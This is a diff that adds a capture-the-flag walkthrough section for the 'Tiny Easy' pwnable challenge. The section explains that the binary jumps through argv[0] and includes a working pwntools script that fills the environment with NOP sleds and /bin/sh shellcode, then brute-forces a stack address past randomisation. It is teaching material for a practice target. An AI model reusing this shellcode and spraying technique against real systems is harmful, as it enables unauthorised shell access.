@@ -1,5 +1,55 @@
 
 # PwnableWalkthrough
+
+### Tiny Easy - Level 6
+
+Now we have a program which contains just 4 lines of assembly instructions:
+
+```assembly
+0x8048054:   pop    eax
+0x8048055:   pop    edx
+0x8048056:   mov    edx,DWORD PTR [edx]
+0x8048058:   call   edx
+```
+It pops twice, and jumps to where the pointer points to.
+Since that at the beginning of each program the os is pushing argv + env to the stack,
+the program will call `argv[0]`.
+So now we have found a way to jump to any location we want.
+The problem in this challenge is that we have some kind of alsr, which randomizes our stack.
+So that means we don't have a constant address of where the stack start, so we can't just jump there.
+My way of bypassing that is by using brute force.
+We fill all of the stack with nops, by adding a lot of environment variables that will be pushed to the stack.
+and after that there will be our shellcode.
+we can try to run the program a lot of times and jump to an address we decide.
+If the address is by any chance in the stack, we will reach our shellcode and get a shell.
+A good way to choose the address is by running the program in `gdb`, and looking at where `argv` is.
+(it doesn't mean that it will be always that address, but it means that its possible)
+
+Exploit:
+
+```python
+from pwn import *
+
+shellCode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+
+path = "tiny_easy"
+address = '\x69\x69\xb0\xff'
+envv = {str(i):("\x90" * 1000 + shellCode) for i in range(200)}
+
+for i in range(400):
+
+        temp = process(argv=[address], executable=path, env=envv)
+        try:
+                temp.recvline(timeout=1)
+                temp.interactive()
+                break
+        except Exception as e:
+                temp.close()
+                print(i, "failed")
+                print(e)
+```
+
+
 ### Fix - Level 9
 
 We have a simple c program, which simulates buffer overflow with a shellcode from shell-storm.
